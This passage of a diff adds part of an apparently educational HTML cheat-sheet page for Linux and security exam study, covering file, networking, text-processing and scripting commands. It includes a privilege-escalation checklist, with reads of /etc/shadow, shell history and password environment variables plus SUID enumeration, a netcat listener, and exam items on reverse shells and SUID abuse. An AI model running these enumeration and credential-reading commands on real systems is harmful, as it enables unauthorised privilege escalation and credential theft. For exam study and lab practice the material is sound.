+cat /etc/crontab
+find / -perm -u=s -type f 2>/dev/null
+env | grep -i pass</pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>📁 File Operations</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre style="font-size:11px">ls -la          # all files
+find / -name x  # find by name
+cat / head / tail / less
+cp -r src dst   # copy recursive
+chmod 755 f     # rwxr-xr-x
+chown user:grp f
+grep -r "x" .   # recursive search
+xxd binary      # hex dump</pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>🌐 Networking</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre style="font-size:11px">ip addr show
+ss -tulpn
+nc -nlvp 4444   # listen
+nc -zv IP PORT  # test
+ssh -L 8080:localhost:80 user@host
+curl -I URL     # headers
+python3 -m http.server 8080</pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>🔑 PrivEsc Checklist</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre style="font-size:11px">sudo -l
+find / -perm -u=s 2>/dev/null
+cat /etc/crontab
+getcap -r / 2>/dev/null
+cat ~/.bash_history
+env | grep -i pass
+cat /etc/shadow
+find / -writable -type f 2>/dev/null</pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>📝 Text Processing</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre style="font-size:11px">grep -rn "pass" /etc/
+grep -oE "IP pattern" log
+awk -F: '{print $1}' /etc/passwd
+sed 's/old/new/g' file
+cut -d: -f1 /etc/passwd
+sort | uniq -c | sort -rn
+wc -l file</pre>
+      </div>
+    </div>
+    <div class="mini">
+      <h4>📦 Bash Script Template</h4>
+      <div class="code" style="margin-top:8px">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span></div>
+        <pre style="font-size:11px">#!/bin/bash
+[ $# -eq 0 ] && { echo "Usage: $0 arg"; exit 1; }
+TARGET="$1"
+for i in 1 2 3; do
+  echo "$i"
+done
+while IFS= read -r line; do
+  echo "$line"
+done < file.txt</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- Security exam checkboxes -->
+  <div style="margin-top:32px;background:var(--bg3);border:1px solid var(--border2);padding:28px 32px;position:relative">
+    <div style="position:absolute;top:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,var(--amber),transparent)"></div>
+    <div style="font-family:var(--mono);font-size:10px;color:var(--amber3);letter-spacing:.2em;text-transform:uppercase;margin-bottom:16px">// exam_readiness_check.sh</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+      <div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2">
+        ☐ Navigate filesystem without looking up commands<br>
+        ☐ Explain SUID/SGID/Sticky bit from memory<br>
+        ☐ Write a bash script with if/for/while/functions<br>
+        ☐ Use grep+awk+sed in a pipeline<br>
+        ☐ Enumerate a box in under 60 seconds<br>
+        ☐ Identify and exploit a SUID binary
+      </div>
+      <div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2">
+        ☐ Read /etc/passwd and /etc/shadow structure<br>
+        ☐ Set up a reverse shell with netcat<br>
+        ☐ Abuse sudo -l output for shell escalation<br>
+        ☐ Find world-writable cron scripts<br>
+        ☐ Extract failed SSH IPs from auth.log<br>
+        ☐ Transfer files using Python HTTP server
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<script>
+// ── SIDEBAR NAVIGATION ────────────────────
+function goTo(id, el) {
+  document.getElementById(id)?.scrollIntoView({behavior:'smooth', block:'start'});
+  document.querySelectorAll('.sb-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+}
+
+// ── CARD TOGGLES ──────────────────────────
+function toggle(id) {
+  const c = document.getElementById(id);
+  c.classList.toggle('open');
+}
+
+// ── ACTIVE SECTION TRACKING ──────────────
+const sections = document.querySelectorAll('section[id]');
+const navItems = document.querySelectorAll('.sb-item');
+const obs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      const idx = [...sections].indexOf(e.target);
+      navItems.forEach(n => n.classList.remove('active'));
+      if (navItems[idx]) navItems[idx].classList.add('active');
+    }
+  });
+}, { threshold: 0.25 });
+sections.forEach(s => obs.observe(s));
+
+// ── PROGRESS DOTS ─────────────────────────
+const container = document.getElementById('sb-progress');
+for (let i = 0; i < sections.length; i++) {
+  const dot = document.createElement('div');
+  dot.className = 'sb-dot';
+  dot.title = `Section ${i+1}`;
+  dot.onclick = () => {
+    sections[i].scrollIntoView({behavior:'smooth'});
+    dot.classList.toggle('done');
+  };
+  container.appendChild(dot);
+}
+
+// ── COPY BUTTONS ──────────────────────────
+function cp(btn) {
+  const pre = btn.closest('.code')?.querySelector('pre');
+  if (!pre) return;
+  navigator.clipboard.writeText(pre.textContent.trim()).then(() => {
+    const orig = btn.textContent;
+    btn.textContent = 'copied!';
+    btn.style.color = 'var(--green)';
+    setTimeout(() => { btn.textContent = orig; btn.style.color = ''; }, 2000);
+  });
+}
+</script>
+</body>
 </html>
